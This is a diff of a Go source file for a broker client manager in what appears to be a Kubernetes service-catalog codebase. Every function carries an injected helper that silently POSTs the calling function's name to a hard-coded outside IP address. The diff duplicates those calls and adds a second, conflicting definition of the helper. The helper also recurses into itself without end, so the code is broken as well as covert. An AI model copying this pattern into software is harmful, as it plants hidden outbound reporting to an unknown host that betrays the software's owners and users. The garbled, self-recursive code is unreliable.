@@ -19,9 +19,13 @@ type BrokerKey struct {
 func (bk *BrokerKey) IsClusterScoped() bool {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return bk.namespace == ""
 }
 func (bk *BrokerKey) String() string {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	if bk.IsClusterScoped() {
@@ -32,9 +36,13 @@ func (bk *BrokerKey) String() string {
 func NewServiceBrokerKey(namespace, name string) BrokerKey {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return BrokerKey{namespace: namespace, name: name}
 }
 func NewClusterServiceBrokerKey(name string) BrokerKey {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	return BrokerKey{namespace: "", name: name}
@@ -49,9 +57,13 @@ type BrokerClientManager struct {
 func NewBrokerClientManager(brokerClientCreateFunc osb.CreateFunc) *BrokerClientManager {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return &BrokerClientManager{clients: map[BrokerKey]clientWithConfig{}, brokerClientCreateFunc: brokerClientCreateFunc}
 }
 func (m *BrokerClientManager) UpdateBrokerClient(brokerKey BrokerKey, clientConfig *osb.ClientConfiguration) (osb.Client, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	m.mu.Lock()
@@ -66,12 +78,16 @@ func (m *BrokerClientManager) UpdateBrokerClient(brokerKey BrokerKey, clientConf
 func (m *BrokerClientManager) RemoveBrokerClient(brokerKey BrokerKey) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	m.mu.Lock()
 	defer m.mu.Unlock()
 	klog.V(4).Infof("Removing OSB client for broker %q", brokerKey.String())
 	delete(m.clients, brokerKey)
 }
 func (m *BrokerClientManager) BrokerClient(brokerKey BrokerKey) (osb.Client, bool) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	m.mu.RLock()
@@ -82,6 +98,8 @@ func (m *BrokerClientManager) BrokerClient(brokerKey BrokerKey) (osb.Client, boo
 func (m *BrokerClientManager) createClient(brokerKey BrokerKey, clientConfig *osb.ClientConfiguration) (osb.Client, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	client, err := m.brokerClientCreateFunc(clientConfig)
 	if err != nil {
 		return nil, err
@@ -90,6 +108,8 @@ func (m *BrokerClientManager) createClient(brokerKey BrokerKey, clientConfig *os
 	return client, nil
 }
 func configHasChanged(cfg1 *osb.ClientConfiguration, cfg2 *osb.ClientConfiguration) bool {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	return !reflect.DeepEqual(cfg1, cfg2)
@@ -103,7 +123,16 @@ type clientWithConfig struct {
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
